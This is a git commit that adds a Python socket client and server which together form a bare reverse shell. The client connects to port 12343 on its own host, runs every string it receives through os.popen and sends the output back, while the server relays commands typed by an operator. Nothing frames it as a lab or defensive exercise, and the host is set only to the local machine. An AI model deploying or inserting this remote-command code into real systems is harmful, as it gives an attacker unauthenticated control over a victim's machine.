d90737a9f111748cd9f5b792978c8faf5d103b8f
Dilmuhammad Abdukodirov <145844965+Dilmuhammad06@users.noreply.github.com>
2024-07-11 16:52:30 +0500

    Add files via upload

---
+++ client.py
@@ -0,0 +1,14 @@
+import socket
+import os
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((socket.gethostname(),12343))
+
+
+while True:
+    msg = str(s.recv(1024).decode("utf-8"))
+    print(msg)
+    print("Got it...")
+    terminal = os.popen(msg).read()
+    s.send(bytes(terminal,"utf-8"))
+    print("Done.")
---
+++ server.py
@@ -0,0 +1,17 @@
+import socket
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.bind((socket.gethostname(),12343))
+s.listen(5)
+
+while True:
+    
+    clientsocket,address = s.accept()
+    print(f'Connection from {address}')
+    clientsocket.send(bytes("Server is connected","utf-8"))
+    
+    while True:
+        inp = input("Command: ")
+        clientsocket.send(bytes(inp,"utf-8"))
+        mes = clientsocket.recv(1024).decode("utf-8")
+        print(mes)
